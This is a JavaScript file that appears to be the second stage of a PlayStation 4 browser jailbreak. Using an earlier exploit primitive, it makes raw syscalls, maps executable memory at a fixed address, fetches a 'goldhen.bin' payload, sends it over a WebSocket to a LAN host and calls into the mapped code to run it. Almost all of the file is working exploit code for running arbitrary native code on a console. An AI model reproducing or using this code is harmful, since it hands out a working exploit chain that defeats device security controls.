var p;

window.stage2 = function () {
  try {
    p = window.prim;

    // Check if kernel already patched
    const kernelOk = p.syscall("sys_setuid", 0);
    if (kernelOk !== 0) {
      fail("Kernel not patched");
      return;
    }

    // Allocate memory at a fixed address
    const code_addr = new int64(0x26100000, 0x00000009);
    const mmap = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
    if (mmap.low !== 0x26100000 || mmap.hi !== 0x00000009) {
      fail("Memory allocation failed");
      return;
    }

    // Fetch and send the payload
    send_payload("goldhen.bin", code_addr);
    awaitpl();
  } catch (e) {
    fail("Stage2 Error: " + e);
  }
};

function send_payload(fileName, code_addr) {
  const ip = "192.168.50.120"; // Change to your PC's IP if needed
  const ws = new WebSocket(`ws://${ip}:9020/send`);
  ws.binaryType = "arraybuffer";

  ws.onopen = () => {
    fetch(fileName)
      .then(res => res.arrayBuffer())
      .then(buf => {
        ws.send(buf);
        ws.close();
        p.fcall(code_addr); // Launch payload
        allset();
      })
      .catch(() => fail("Fetch failed"));
  };

  ws.onerror = () => {
    fail("WebSocket error");
  };
}
